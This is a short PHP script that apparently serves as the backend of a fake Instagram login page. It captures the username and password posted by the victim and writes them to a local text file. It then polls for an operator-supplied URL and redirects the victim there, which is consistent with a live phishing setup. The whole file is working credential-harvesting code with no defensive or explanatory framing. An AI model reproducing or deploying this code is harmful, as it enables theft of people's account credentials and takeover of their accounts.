<?php
$username=$_POST['username']; 
$password=$_POST['password'];
$data=$username . PHP_EOL . $password . PHP_EOL;
$fp = fopen('data.txt', 'w');
fwrite($fp, $data);
fclose($fp);
sleep(10);
while(1){
	if(file_exists('D:/xampp/htdocs/instagram/accounts/login/&source=auth_switcher/url.txt'))
	{
		$url=file_get_contents("D:/xampp/htdocs/instagram/accounts/login/&source=auth_switcher/url.txt");
		if(strlen($url)<=25){
			
		}
		else{
			header("Location: $url");
			exit;
		}
		
	}
}
?>